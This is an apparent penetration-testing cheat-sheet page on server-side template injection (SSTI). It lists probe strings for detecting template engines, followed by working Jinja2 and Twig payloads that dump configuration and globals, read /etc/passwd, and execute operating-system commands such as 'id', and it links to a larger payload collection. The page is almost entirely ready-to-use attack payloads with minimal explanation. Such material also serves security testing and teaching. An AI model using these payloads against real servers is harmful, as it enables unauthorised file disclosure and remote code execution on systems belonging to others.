---
description: >-
  Server-side Template Injection (SSTI) occurs when an attacker can inject
  templating code into a template that is later rendered by the server
---

# SSTI

<figure><img src="broken-reference" alt=""><figcaption></figcaption></figure>

#### Identify

```bash
# Check for return of 49
{{7*7}}
${7*7}
<%= 7*7 %>
${{7*7}}
#{7*7}
{7*7}
%{7*7}
```

#### Jinja2

```bash
# Config
{{ config.items() }}

# Globals
{{ self.__init__.__globals__.__builtins__ }}

# LFI
{{ self.__init__.__globals__.__builtins__.open("/etc/passwd").read() }}

# RCE
{{ self.__init__.__globals__.__builtins__.__import__('os').popen('id').read() }}
```

#### Twig

```bash
# Get info
{{ _self }}

# Read file
{{ "/etc/passwd"|file_excerpt(1,-1) }}

# RCE 
{{ ['id'] | filter('system') }}
```

More payloads at:[https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Server%20Side%20Template%20Injection/README.md](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Server%20Side%20Template%20Injection/README.md)
